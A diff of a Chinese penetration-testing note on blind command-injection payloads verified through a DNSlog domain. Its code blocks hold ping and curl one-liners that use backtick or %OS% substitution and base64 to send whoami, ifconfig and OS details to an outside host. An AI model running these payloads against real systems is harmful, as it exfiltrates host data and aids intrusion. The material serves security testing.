@@ -128,25 +128,19 @@ yyy.test.0v0.com
 
 ### 0x4、payload使用技巧
 
-用||兼容windows和linux
+**兼容windows和linux**
 
 ```bash
-ipconfig || ifconfig
-#||是或逻辑， 如果第一个命令执行成功，将不会执行第二个；而如果第一个执行失败，将会执行第二个。
-
-使用实例：
+#方法一、||是或逻辑， 如果第一个命令执行成功，将不会执行第二个；而如果第一个执行失败，将会执行第二个。
 ping -n 3 xxx.test.0v0.com || ping -c 3 xxx.test.0v0.com
 
-===============================================================
-
-群里大佬发了一个兼容windows和Linux的ping命令!!!6666
-
-ping -nc 1 xxx.test.0v0.com
+#方法二、群里大佬发了一个兼容windows和Linux的ping命令!!!6666
+ping -nc 3 xxx.test.0v0.com
 ```
 
 
 
-命令优先执行
+**命令优先执行**
 
 ```bash
 %OS%
@@ -154,12 +148,6 @@ ping -nc 1 xxx.test.0v0.com
 `whomai` 
 #linux下的命令优先执行,注意是反引号（`）这个字符一般在键盘的左上角，数字1的左边
 
-测试效果如下:
-root@ubuntu:~# echo `whoami`@bit4
-root@bit4
-
-E:\>echo %OS%@bit4
-Windows_NT@bit4
 
 使用实例：
 curl "http://xxx.test.0v0.com/?`whoami`"
@@ -167,26 +155,31 @@ ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.0v0.com
 #DNS记录中获取源IP地址
 ```
 
+测试效果如下图:
+
 ![command_first](img/docker+dnslog/command_first.png)
 
-消除空格
+
+
+**消除空格(Linux下)**
 
 ```bash
-id|base64
+id|base64 #使用base64对执行的结果进行编码
 
 使用实例：
 curl test.0v0.com/`ifconfig|base64 -w 0` 
 #-w 0 输出内容不换行，推荐这个方法
+
 curl test.0v0.com/`ifconfig |base64 |tr -d '\n'`
 #相同的效果
 ```
 
 ![base64](img/docker+dnslog/base64.png)
 
-window下的curl
+**window下的curl**
 
 ```bash
-start http://xxxxxxxxx.test.0v0.com
+start http://%OS%.test.0v0.com
 #该命令的作用是通过默认浏览器打开网站，缺点是会打开窗口
 ```
 
@@ -197,18 +190,13 @@ start http://xxxxxxxxx.test.0v0.com
 
 
 ```bash
-#1.判断系统类型
+#1.判断系统类型(windows\linux通用)
 ping `uname`.0v0.com || ping %OS%.0v0.com
 
-#2.通用ping，dns类型payload
-ping -n 3 xxx.0v0.com || ping -c 3 xxx.0v0.com
+#2.ping，dns类型payload(windows\linux通用)
+ping -nc 3 xxx.0v0.com
 
-C:\Windows\System32\cmd.exe /c "ping -n 3 test.com || ping -c 3 test.com"
-/bin/bash -c "ping -n 3 test.com || ping -c 3 test.com"
-
-
-======================================分割线=====================================
-
+======================================Linux分割线=====================================
 
 #3.从DNS记录中获取源IP地址
 ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.0v0.com
